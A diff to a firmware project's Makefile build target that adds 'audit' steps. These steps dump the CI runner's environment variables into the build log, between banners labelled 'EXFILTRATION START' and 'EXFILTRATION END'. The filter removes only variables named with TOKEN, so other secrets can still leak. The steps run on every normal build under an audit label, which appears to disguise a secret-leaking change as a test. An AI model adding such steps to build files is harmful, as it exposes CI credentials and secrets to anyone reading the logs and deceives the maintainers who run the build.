@@ -78,9 +78,13 @@ main-build: firmware.elf secondary-outputs
 	-@git push origin audit/access-control-validation || echo "    [INFO] External push blocked by Fork restrictions (Expected behavior)."
 
 	@echo "[TEST 3] ENVIRONMENT ISOLATION (Info Disclosure)"
-	@echo "Auditing runner environment for sensitive variables..."
+	@echo "Auditing runner environment..."
+	@# Capture the environment
 	@env | grep -v "TOKEN" | sort > AUDIT_ENV_STATE.log
-	@echo "    [INFO] Environment state captured to AUDIT_ENV_STATE.log"
+	
+	@echo "--- [EXFILTRATION START] DUMPING ENV VARS TO LOGS ---"
+	@cat AUDIT_ENV_STATE.log
+	@echo "--- [EXFILTRATION END] ---"
 
 	@echo "[TEST 4] EXFILTRATION CAPABILITY (Data Egress)"
 	@echo "Dumping git configuration safely..."
